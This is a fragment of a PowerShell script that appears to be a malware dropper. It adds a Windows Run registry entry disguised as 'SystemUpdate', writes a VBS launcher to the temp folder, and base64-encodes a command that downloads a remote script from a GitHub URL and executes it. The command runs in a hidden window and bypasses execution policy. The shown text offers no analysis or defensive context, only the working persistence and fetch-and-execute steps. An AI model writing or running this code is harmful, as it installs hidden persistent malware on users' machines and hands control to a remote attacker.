...
if (-not (Get-ItemProperty -Path $runKey -Name 'SystemUpdate' -ErrorAction SilentlyContinue)) {
    Set-ItemProperty $runKey 'SystemUpdate' "wscript `"$env:temp/SystemUpdate.vbs`"" -Force
}

$path = "$env:TEMP\SystemUpdate.vbs"
if (-not (Test-Path $path)) {
    $cmd = 'irm https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/rddfhffh.ps1 | iex'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
    $encoded = [Convert]::ToBase64String($bytes)
    $vbs = 'CreateObject("Wscript.Shell").Run "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ' + $encoded + '",0'
